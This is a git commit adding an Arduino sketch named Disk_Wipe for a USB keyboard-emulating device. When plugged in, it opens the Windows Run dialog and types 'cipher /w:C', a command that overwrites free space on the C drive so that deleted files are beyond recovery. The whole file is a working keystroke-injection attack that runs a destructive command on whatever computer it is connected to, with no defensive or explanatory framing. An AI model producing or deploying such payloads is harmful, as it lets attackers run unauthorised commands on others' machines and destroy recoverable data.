bd3d51f6ad3b3f068b0a7f6055226f50a91fba4d
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-02-08 22:23:54 +0330

    Create Disk_Wipe.ino

---
+++ sketches/Disk_Wipe.ino
@@ -0,0 +1,16 @@
+#include <USBHIDKeyboard.h>
+USBHIDKeyboard Keyboard;
+
+void setup() {
+  Keyboard.begin();
+  delay(3000);
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.println(F("cipher /w:C"));
+}
+
+void loop() {}
